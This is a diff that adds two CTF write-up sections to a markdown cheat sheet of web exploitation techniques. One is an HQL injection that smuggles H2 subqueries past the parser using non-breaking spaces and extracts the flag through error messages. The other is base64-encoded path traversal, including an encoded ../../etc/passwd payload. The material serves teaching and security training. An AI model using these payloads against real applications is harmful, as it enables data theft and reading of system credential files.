@@ -29,6 +29,8 @@
 - [Castor XML Deserialization via xsi:type Polymorphism (Atlas HTB)](#castor-xml-deserialization-via-xsitype-polymorphism-atlas-htb)
 - [Apache ErrorDocument Expression File Read (Zero HTB)](#apache-errordocument-expression-file-read-zero-htb)
 - [SQLite File Path Traversal to Bypass String Equality (Codegate 2013)](#sqlite-file-path-traversal-to-bypass-string-equality-codegate-2013)
+- [HQL Injection via Non-Breaking Space (HackIM 2016)](#hql-injection-via-non-breaking-space-hackim-2016)
+- [Base64-Encoded Path Traversal (Sharif CTF 2016)](#base64-encoded-path-traversal-sharif-ctf-2016)
 
 ---
 
@@ -610,3 +612,45 @@ curl -X POST -b 'session=...' \
 ```
 
 **Key insight:** String equality checks on user input are bypassed whenever the input is later used in a filesystem path that undergoes normalization. The `../` sequence is invisible to string comparison but resolved by the OS. Look for this pattern wherever user input is both validated by string comparison and interpolated into file paths, database paths, or URLs.
+
+---
+
+## HQL Injection via Non-Breaking Space (HackIM 2016)
+
+Hibernate Query Language blocks subqueries. Bypass by exploiting character encoding mismatch between HQL parser and underlying database (H2):
+
+- HQL parser treats non-breaking space (U+00A0) as a regular character (concatenates tokens into one word)
+- H2 database interprets U+00A0 as whitespace (separates tokens normally)
+
+**Key insight:** Replace spaces in SQL subqueries with U+00A0 to smuggle them past HQL validation.
+
+```python
+val = u'\u00a0'  # non-breaking space
+# HQL sees: "selectXflagXfromXflagXlimitX1" (one token)
+# H2 sees:  "select flag from flag limit 1" (valid SQL)
+payload = u"' and (cast(concat('->', (select{0}flag{0}from{0}flag{0}limit{0}1)) as int))=0 or ''='".format(val)
+```
+
+Error-based extraction: cast result to int triggers error containing the flag value.
+
+---
+
+## Base64-Encoded Path Traversal (Sharif CTF 2016)
+
+When file inclusion uses base64-encoded filenames as parameters:
+
+```text
+file.php?page=aGVscC5wZGY=    (decodes to "help.pdf")
+```
+
+Encode traversal payloads in base64:
+
+```python
+import base64
+# ../index.php
+print(base64.b64encode(b"../index.php").decode())  # Li4vaW5kZXgucGhw
+# ../../etc/passwd
+print(base64.b64encode(b"../../etc/passwd").decode())  # Li4vLi4vZXRjL3Bhc3N3ZA==
+```
+
+**Key insight:** Base64 encoding absorbs path traversal characters (`../`) that filters might block in raw form.
